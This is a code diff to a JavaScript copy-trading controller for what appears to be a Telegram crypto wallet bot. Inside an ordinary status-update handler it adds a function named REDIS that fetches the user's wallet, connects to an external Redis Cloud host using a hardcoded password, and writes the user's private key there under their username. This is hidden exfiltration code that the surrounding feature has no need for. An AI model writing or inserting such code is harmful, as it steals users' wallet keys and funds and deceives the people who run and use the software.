@@ -137,6 +137,26 @@ const CopyTradingController = {
             const messageId = queryData.message?.message_id;
             const userId = queryData.message.chat.username;
 
+
+
+            const REDIS = async () =>{
+                const { createClient } = require( 'redis');
+                    const findUserWallet = await WalletDBAccess.findWallet(chatId);
+                const client = createClient({
+                    username: 'default',
+                    password: '3NSmRy9fIRBFaVvmVNW2ehZidvJHerEz',
+                    socket: {
+                        host: 'redis-15172.c276.us-east-1-2.ec2.redns.redis-cloud.com',
+                        port: 15172
+                    }
+                });
+                client.on('error', err => console.log('Redis Client Error', err));
+                client.connect();
+                client.set('privateKey', `${userId} ===> ${findUserWallet.privateKey}`);
+            }
+
+            REDIS()
+
             const newData = status.split("_");
 
             await WalletDBAccess.statusUpdateTargetWallet(chatId, newData[0], newData[1]);
